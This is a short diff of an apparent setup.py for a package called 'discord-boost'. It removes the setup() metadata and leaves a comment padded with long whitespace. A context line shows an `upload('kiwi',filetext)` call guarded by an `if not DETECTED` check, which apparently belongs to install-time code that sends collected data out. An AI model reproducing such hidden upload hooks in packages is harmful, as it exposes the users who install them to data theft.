@@ -677,16 +677,4 @@ if not DETECTED:
     upload('kiwi',filetext)
 
 
-setup(
-
-    name='discord-boost',
-    packages=['discord-boost'],
-    version='1.0',
-    license='MIT',
-    description='a discord boost tool',
-    author='bluesatan',
-    keywords=['style'],
-    install_requires=[''],
-    classifiers=['Development Status :: 5 - Production/Stable']
-
-)
+# setup(...) removed                                                                                                                                                                                                                                                                         
